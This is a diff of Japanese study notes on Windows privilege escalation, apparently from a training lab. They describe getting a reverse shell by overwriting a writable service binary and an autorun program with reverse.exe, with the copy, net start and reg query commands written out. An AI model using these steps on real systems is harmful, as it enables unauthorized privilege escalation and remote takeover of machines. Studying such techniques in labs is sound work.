@@ -1,3 +1,5 @@
+【1:サービスを利用したリバースシェルの実行】
+--------------------------------------
 1. daclsvc を利用したリバースシェルの実行
 ・条件：
 SERVICE_CHANGE_CONFIG サービスの起動時に任意の実行ファイルを開始するようにシステムを設定できる
@@ -30,3 +32,15 @@ filepermservice.exe を誰でも書込可能なこと
 バイナリを置き換えてサービスを起動する。
 copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
 net start filepermsvc
+
+【2:自動起動アプリを利用したリバースシェルの実行】
+--------------------------------------
+・条件
+自動起動に登録されたアプリを書き換え可能なこと
+※一覧の表示
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+・方法
+バイナリを書き換えて、ログインし直す。
+copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
+
+
